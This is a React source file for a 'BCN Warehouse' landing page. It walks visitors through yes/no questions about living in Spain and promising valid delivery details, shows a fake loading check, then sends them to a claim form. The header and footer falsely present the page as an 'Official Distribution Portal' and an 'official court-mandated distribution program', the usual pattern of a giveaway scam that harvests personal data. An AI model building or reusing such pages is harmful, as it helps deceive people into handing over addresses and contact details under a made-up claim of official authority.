import { useState } from "react";
import { AnimatePresence } from "framer-motion";
import { HeroSection } from "@/components/HeroSection";
import { QuizStep } from "@/components/QuizStep";
import { LoadingCheck } from "@/components/LoadingCheck";
import { SuccessConfirmation } from "@/components/SuccessConfirmation";

type Step = "hero" | "location" | "promise" | "loading" | "success";

const Index = () => {
  const [currentStep, setCurrentStep] = useState<Step>("hero");

  const handleNext = (nextStep: Step) => {
    setCurrentStep(nextStep);
  };

  const handleClaimClick = () => {
    // This would navigate to the checker/form page
    window.location.href = "/checker";
  };

  return (
    <div className="min-h-screen bg-hero-gradient flex flex-col">
      {/* Background effects */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/10 rounded-full blur-3xl" />
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-primary/5 rounded-full blur-3xl" />
      </div>

      {/* Header */}
      <header className="relative z-10 flex items-center justify-between px-6 py-4">
        <div className="text-lg font-bold text-foreground">
          📦 BCN Warehouse
        </div>
        <div className="text-xs text-muted-foreground">
          Official Distribution Portal
        </div>
      </header>

      {/* Main content */}
      <main className="relative z-10 flex-1 flex items-center justify-center py-8">
        <div className="w-full max-w-3xl">
          <AnimatePresence mode="wait">
            {currentStep === "hero" && (
              <HeroSection
                key="hero"
                onStart={() => handleNext("location")}
              />
            )}

            {currentStep === "location" && (
              <QuizStep
                key="location"
                question="Are you located in Spain?"
                description="This offer is only available for residents within Spanish territory due to distribution regulations."
                onConfirm={() => handleNext("promise")}
                buttonText="Yes, I'm in Spain"
              />
            )}

            {currentStep === "promise" && (
              <QuizStep
                key="promise"
                question="Do you promise to provide valid delivery information?"
                description="To ensure successful delivery, we require accurate address and contact details."
                onConfirm={() => handleNext("loading")}
                buttonText="Yes, I promise"
              />
            )}

            {currentStep === "loading" && (
              <LoadingCheck
                key="loading"
                onComplete={() => handleNext("success")}
              />
            )}

            {currentStep === "success" && (
              <SuccessConfirmation
                key="success"
                onContinue={handleClaimClick}
              />
            )}
          </AnimatePresence>
        </div>
      </main>

      {/* Footer */}
      <footer className="relative z-10 px-6 py-4 text-center text-xs text-muted-foreground">
        <p>© 2026 Barcelona Warehouse Distribution. All rights reserved.</p>
        <p className="mt-1">This is an official court-mandated distribution program.</p>
      </footer>
    </div>
  );
};

export default Index;
